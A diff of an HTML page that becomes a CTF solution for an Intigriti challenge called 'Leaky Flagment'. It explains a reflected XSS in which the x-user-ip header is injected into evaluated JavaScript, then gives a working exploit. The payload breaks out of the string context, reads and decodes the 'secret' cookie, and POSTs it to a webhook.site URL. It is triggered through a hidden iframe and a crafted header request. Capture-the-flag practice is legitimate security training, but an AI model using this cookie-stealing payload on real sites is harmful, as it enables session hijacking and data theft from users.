@@ -1,70 +1,166 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Redirecting to Vulnerable Page...</title>
-    <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="2;url=https://challenge-0325.intigriti.io/note/demo-note-id">
+    <title>CTF Solution</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            max-width: 600px;
-            margin: 100px auto;
+            max-width: 800px;
+            margin: 0 auto;
             padding: 20px;
-            text-align: center;
-            background-color: #f8f9fa;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
-        h1 {
-            color: #333;
+        pre {
+            background-color: #f5f5f5;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
         }
-        .loader {
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #3498db;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 2s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        p {
-            color: #666;
-            line-height: 1.5;
-        }
-        .countdown {
-            font-size: 20px;
-            font-weight: bold;
-            color: #dc3545;
+        .explanation {
+            margin-top: 30px;
+            border-left: 4px solid #4CAF50;
+            padding-left: 15px;
         }
     </style>
 </head>
 <body>
-    <h1>Exploit XSS Leaky Flagment</h1>
-    <div class="loader"></div>
-    <p>Reindirizzamento alla pagina vulnerabile tra <span id="countdown" class="countdown">2</span> secondi...</p>
-    <p>Questa pagina reindirizza automaticamente alla pagina demo delle note.</p>
-    <p>La pagina delle note contiene una vulnerabilità XSS nell'endpoint /api/track.</p>
+    <h1>Leaky Flagment CTF Solution</h1>
+    
+    <div id="status">Loading exploit...</div>
+    
+    <div class="explanation">
+        <h2>Vulnerability Explanation</h2>
+        <p>This exploit targets a reflected XSS vulnerability in the <code>/api/track</code> endpoint. The application takes the <code>x-user-ip</code> header and directly injects it into JavaScript that is later evaluated with <code>eval()</code>.</p>
+        
+        <h3>Vulnerability Details</h3>
+        <p>In the <code>note/[id]/page.jsx</code> file, there's a script tag that fetches from <code>/api/track</code> and evaluates the response:</p>
+        <pre>
+fetch("/api/track", {
+  method: "GET",
+  cache: "no-store",
+  headers: {
+      "x-user-ip": "${userIP}",
+  },
+})
+  .then(async (res) => {
+      if (res.ok) {
+          eval(await res.text());
+      }
+  })
+  .catch((error) => {
+      console.error(error);
+  });
+        </pre>
+        
+        <p>In <code>/api/track.js</code>, the <code>x-user-ip</code> header is inserted directly into JavaScript without proper sanitization:</p>
+        <pre>
+const jsContent = `
+$(document).ready(function() {
+    const userDetails = {
+        ip: "${userIp}",
+        type: "client",
+        timestamp: new Date().toISOString(),
+        ipDetails: {}
+    };
+    // ... more code ...
+});`
+        </pre>
+    </div>
     
     <script>
-        // Semplice countdown
-        let seconds = 2;
-        const countdownElement = document.getElementById('countdown');
+        // URL of the note page that contains the vulnerable code
+        const noteUrl = "/note/demo-note-id";
         
-        const interval = setInterval(() => {
-            seconds--;
-            countdownElement.textContent = seconds;
-            
-            if (seconds <= 0) {
-                clearInterval(interval);
-            }
-        }, 1000);
+        // Our malicious payload to inject via the x-user-ip header
+        // This breaks out of the string context and injects our own code
+        const payload = `
+";  // Close the string
+});  // Close the ready function
+
+// Steal the admin's cookie (which contains the flag)
+(function(){
+    try {
+        // Get the secret cookie that contains base64(username:FLAG)
+        const secretCookie = document.cookie.match(/secret=([^;]+)/);
+        if (!secretCookie) {
+            console.error('No secret cookie found');
+            return;
+        }
         
-        // Log per debug
-        console.log("Redirecting to vulnerable page in 2 seconds...");
+        // Decode the cookie and extract the FLAG
+        const encodedValue = secretCookie[1];
+        const decodedValue = atob(encodedValue);
+        const flag = decodedValue.split(':')[1];
+        
+        // Send the FLAG to our webhook
+        fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                flag: flag,
+                origin: document.location.href,
+                time: new Date().toString()
+            })
+        });
+    } catch (e) {
+        // Send error details to our webhook too
+        fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                error: e.toString(),
+                stack: e.stack,
+                origin: document.location.href
+            })
+        });
+    }
+})();
+
+// Add a dummy function to avoid syntax errors
+$(document).ready(function() { //
+        `.trim();
+        
+        // Create a hidden iframe to load the note page
+        const iframe = document.createElement('iframe');
+        iframe.style.width = "1px";
+        iframe.style.height = "1px";
+        iframe.style.position = "absolute";
+        iframe.style.left = "-9999px";
+        
+        // Function to send our malicious request with the payload
+        function launchAttack() {
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', '/api/track', true);
+            xhr.setRequestHeader('x-user-ip', payload);
+            xhr.onload = function() {
+                console.log("Payload injected:", xhr.status);
+                document.getElementById('status').innerHTML = 
+                    '<span style="color: green; font-weight: bold;">✓ Exploit triggered successfully</span><br>' +
+                    'When the admin bot visits this page, the flag will be sent to the webhook.';
+            };
+            xhr.onerror = function() {
+                console.error("Failed to inject payload");
+                document.getElementById('status').innerHTML = 
+                    '<span style="color: red; font-weight: bold;">✗ Failed to inject payload</span>';
+            };
+            xhr.send();
+        }
+        
+        // When the iframe loads, trigger our attack
+        iframe.onload = function() {
+            console.log("Note page loaded in iframe");
+            launchAttack();
+        };
+        
+        // Load the iframe
+        iframe.src = noteUrl;
+        document.body.appendChild(iframe);
+        
+        // Also try to launch the attack directly
+        setTimeout(launchAttack, 1000);
     </script>
 </body>
 </html>
